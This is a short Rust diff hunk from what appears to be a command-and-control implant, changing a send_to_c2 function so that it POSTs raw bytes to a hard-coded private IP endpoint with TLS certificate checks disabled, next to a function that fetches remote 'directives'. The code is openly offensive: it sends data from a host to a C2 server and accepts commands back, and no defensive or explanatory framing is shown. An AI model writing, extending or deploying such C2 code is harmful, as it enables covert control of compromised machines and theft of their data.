@@ -31,14 +31,14 @@ pub async fn get_directives() -> Result<Vec<String>, Error> {
     Ok(commands)
 }
 
-pub async fn send_to_c2(body: String) -> Result<(), Error> {
+pub async fn send_to_c2(data: Vec<u8>) -> Result<(), Error> {
     let client = reqwest::Client::builder()
         .danger_accept_invalid_certs(true)
         .build()?;
 
     let _res = client
         .post("https://172.18.176.246:3030/directives")
-        .body(body)
+        .body(data)
         .send()
         .await?;
 
